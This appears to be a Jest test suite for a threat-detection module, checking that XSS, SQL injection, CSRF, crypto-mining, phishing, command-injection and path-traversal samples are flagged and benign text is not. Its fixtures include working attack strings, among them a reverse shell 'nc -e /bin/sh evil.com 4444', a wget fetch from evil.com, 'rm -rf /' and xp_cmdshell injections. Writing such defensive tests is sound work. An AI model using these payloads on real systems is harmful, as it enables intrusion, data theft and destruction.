/**
 * Threat Patterns Test Suite
 * Tests for threat detection patterns and signature matching
 */

import { ThreatPatterns } from '../src/utils/patterns.js';

describe('ThreatPatterns', () => {
  let threatPatterns;

  beforeEach(() => {
    threatPatterns = new ThreatPatterns();
  });

  describe('XSS Pattern Detection', () => {
    test('should detect basic script injection', () => {
      const patterns = [
        '<script>alert("xss")</script>',
        '<SCRIPT>evil()</SCRIPT>',
        '<script src="evil.js"></script>',
        '<script>document.cookie</script>'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectXSS(pattern);
        expect(result.detected).toBe(true);
        expect(result.score).toBeGreaterThan(0.5);
      });
    });

    test('should detect event handler XSS', () => {
      const patterns = [
        '<img src=x onerror=alert(1)>',
        '<body onload=evil()>',
        '<div onclick="javascript:alert(1)">',
        '<a href="javascript:evil()">click</a>',
        '<svg onload=alert(document.cookie)>'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectXSS(pattern);
        expect(result.detected).toBe(true);
        expect(result.score).toBeGreaterThan(0.6);
      });
    });

    test('should detect encoded XSS attempts', () => {
      const patterns = [
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<script>\u0061\u006c\u0065\u0072\u0074(1)</script>',
        'javascript&#58;alert(1)'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectXSS(pattern);
        expect(result.detected).toBe(true);
      });
    });

    test('should not flag legitimate content', () => {
      const safeContent = [
        '<p>Hello world</p>',
        '<img src="image.jpg" alt="description">',
        '<a href="https://example.com">link</a>',
        '<div class="script">This is just text</div>',
        'javascript is a programming language'
      ];

      safeContent.forEach(content => {
        const result = threatPatterns.detectXSS(content);
        expect(result.detected).toBe(false);
        expect(result.score).toBeLessThan(0.3);
      });
    });
  });

  describe('SQL Injection Detection', () => {
    test('should detect basic SQL injection', () => {
      const patterns = [
        '\' OR \'1\'=\'1\' --',
        '\'; DROP TABLE users; --',
        '\' UNION SELECT * FROM users --',
        '1; EXEC xp_cmdshell(\'dir\') --',
        '\' AND 1=0 UNION SELECT username, password FROM users --'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectSQLInjection(pattern);
        expect(result.detected).toBe(true);
        expect(result.score).toBeGreaterThan(0.7);
      });
    });

    test('should detect advanced SQL injection', () => {
      const patterns = [
        'UNION ALL SELECT LOAD_FILE(\'/etc/passwd\') --',
        '\'; EXEC master..xp_cmdshell \'net user\' --',
        '1\' AND SLEEP(5) --',
        'BENCHMARK(1000000,MD5(1)) --',
        '\'; DECLARE @x INT; SET @x = 1; --'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectSQLInjection(pattern);
        expect(result.detected).toBe(true);
        expect(result.score).toBeGreaterThan(0.8);
      });
    });

    test('should detect blind SQL injection', () => {
      const patterns = [
        'AND 1=1 --',
        'AND 1=0 --',
        'OR SLEEP(5)=',
        'AND BENCHMARK(1000000,1)=1 --',
        'AND IF(1=1, SLEEP(5), 0) --'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectSQLInjection(pattern);
        expect(result.detected).toBe(true);
      });
    });
  });

  describe('CSRF Pattern Detection', () => {
    test('should detect CSRF attempts', () => {
      const patterns = [
        '<form action="/transfer" method="POST"><input name="amount" value="1000">',
        'fetch("/api/transfer", {method: "POST", body: JSON.stringify({amount: 1000})})',
        '<img src="/api/transfer?amount=1000&to=evil">',
        'XMLHttpRequest to /transfer without CSRF token'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectCSRF(pattern);
        expect(result.detected).toBe(true);
        expect(result.score).toBeGreaterThan(0.4);
      });
    });

    test('should check for CSRF token presence', () => {
      const withToken = {
        headers: { 'X-CSRF-Token': 'valid-token' },
        body: JSON.stringify({ amount: 100, _csrf: 'token' })
      };

      const withoutToken = {
        headers: {},
        body: JSON.stringify({ amount: 100 })
      };

      const result1 = threatPatterns.detectCSRF(JSON.stringify(withToken));
      const result2 = threatPatterns.detectCSRF(JSON.stringify(withoutToken));

      expect(result1.score).toBeLessThan(result2.score);
    });
  });

  describe('Crypto Mining Detection', () => {
    test('should detect crypto mining scripts', () => {
      const patterns = [
        'var miner = new CoinHive.Anonymous',
        'cryptonight',
        'webassembly',
        'miner.start()',
        'coinhive.min.js',
        'deepMiner',
        'cryptoNightWASM',
        'webminerpool'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectCryptoMining(pattern);
        expect(result.detected).toBe(true);
        expect(result.score).toBeGreaterThan(0.6);
      });
    });

    test('should detect mining pool connections', () => {
      const miningUrls = [
        'stratum+tcp://mining.pool.com:3333',
        'ws://miner.pool.com:8080',
        'wss://webminer.com/socket',
        'https://miner.com/worker.js'
      ];

      miningUrls.forEach(url => {
        const result = threatPatterns.detectCryptoMining(url);
        expect(result.detected).toBe(true);
      });
    });
  });

  describe('Phishing Detection', () => {
    test('should detect phishing attempts', () => {
      const patterns = [
        'login.php?redirect=evil.com',
        'password reset link',
        'verify your account',
        'security alert',
        'update payment information',
        'confirm your identity',
        'account suspension notice'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectPhishing(pattern);
        expect(result.detected).toBe(true);
        expect(result.score).toBeGreaterThan(0.4);
      });
    });

    test('should detect suspicious URLs', () => {
      const suspiciousUrls = [
        'https://paypal-secure.com/login',
        'http://bankofamerica-login.net',
        'https://amaz0n-security.com',
        'http://login-microsoft.com',
        'https://secure-google.com/oauth'
      ];

      suspiciousUrls.forEach(url => {
        const result = threatPatterns.detectPhishing(url);
        expect(result.detected).toBe(true);
        expect(result.score).toBeGreaterThan(0.7);
      });
    });
  });

  describe('Command Injection Detection', () => {
    test('should detect command injection', () => {
      const patterns = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '`whoami`',
        '$(ls -la)',
        '; wget http://evil.com/malware',
        '| nc -e /bin/sh evil.com 4444'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectCommandInjection(pattern);
        expect(result.detected).toBe(true);
        expect(result.score).toBeGreaterThan(0.8);
      });
    });

    test('should detect encoded commands', () => {
      const patterns = [
        '%3B%20rm%20-rf%20/',
        '&#59; rm -rf /',
        '\\x3b rm -rf /',
        '\u003b rm -rf /'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectCommandInjection(pattern);
        expect(result.detected).toBe(true);
      });
    });
  });

  describe('Path Traversal Detection', () => {
    test('should detect path traversal attempts', () => {
      const patterns = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '.../...//.../...//.../...//etc/passwd'
      ];

      patterns.forEach(pattern => {
        const result = threatPatterns.detectPathTraversal(pattern);
        expect(result.detected).toBe(true);
        expect(result.score).toBeGreaterThan(0.9);
      });
    });
  });

  describe('Content Analysis', () => {
    test('should analyze mixed content', () => {
      const mixedContent = `
        <script>alert('xss')</script>
        Normal text here
        ' OR '1'='1' --
        More normal content
        <img src=x onerror=alert(1)>
      `;

      const result = threatPatterns.analyzeContent(mixedContent);

      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.score).toBeGreaterThan(0.5);
      expect(result.threats.some(t => t.type === 'xss')).toBe(true);
      expect(result.threats.some(t => t.type === 'sql_injection')).toBe(true);
    });

    test('should calculate threat scores correctly', () => {
      const highThreat = '<script>alert("xss")</script>\'; DROP TABLE users; --';
      const lowThreat = 'normal user input with script word';

      const result1 = threatPatterns.analyzeContent(highThreat);
      const result2 = threatPatterns.analyzeContent(lowThreat);

      expect(result1.score).toBeGreaterThan(result2.score);
      expect(result1.score).toBeGreaterThan(0.7);
      expect(result2.score).toBeLessThan(0.3);
    });
  });

  describe('Performance and Scalability', () => {
    test('should handle large content efficiently', () => {
      const largeContent = 'safe content '.repeat(10000);
      const startTime = performance.now();

      const result = threatPatterns.analyzeContent(largeContent);

      const endTime = performance.now();
      const duration = endTime - startTime;

      expect(duration).toBeLessThan(1000); // Should complete within 1 second
      expect(result.score).toBeLessThan(0.1); // Should be very low for safe content
    });

    test('should handle concurrent analysis', async () => {
      const contents = Array(100).fill().map((_, i) =>
        `<script>alert(${i})</script>`
      );

      const startTime = performance.now();

      const results = contents.map(content =>
        threatPatterns.analyzeContent(content)
      );

      const endTime = performance.now();
      const duration = endTime - startTime;

      expect(duration).toBeLessThan(2000); // Should complete within 2 seconds
      results.forEach(result => {
        expect(result.score).toBeGreaterThan(0.5);
      });
    });
  });

  describe('False Positive Management', () => {
    test('should minimize false positives', () => {
      const legitimateContent = [
        'JavaScript is a programming language',
        'SQL databases are relational',
        'CSRF stands for Cross-Site Request Forgery',
        'Cryptocurrency mining requires hardware',
        'Path traversal in graphs',
        'Command line interface',
        'Phishing is a type of cyber attack',
        'script src="jquery.min.js"',
        'SELECT * FROM users WHERE id = ?',
        'form action="/login" method="POST"'
      ];

      legitimateContent.forEach(content => {
        const result = threatPatterns.analyzeContent(content);
        expect(result.score).toBeLessThan(0.5);
        expect(result.threats.length).toBe(0);
      });
    });

    test('should handle edge cases', () => {
      const edgeCases = [
        '', // Empty string
        '   ', // Whitespace only
        'normal-text-without-any-threats',
        '1234567890', // Numbers only
        '!@#$%^&*()', // Special characters
        'a'.repeat(1000), // Very long string
        'normal text\nwith newlines\nand more text',
        'text with <b>html</b> tags but no scripts'
      ];

      edgeCases.forEach(content => {
        const result = threatPatterns.analyzeContent(content);
        expect(result.score).toBeLessThan(0.3);
      });
    });
  });
});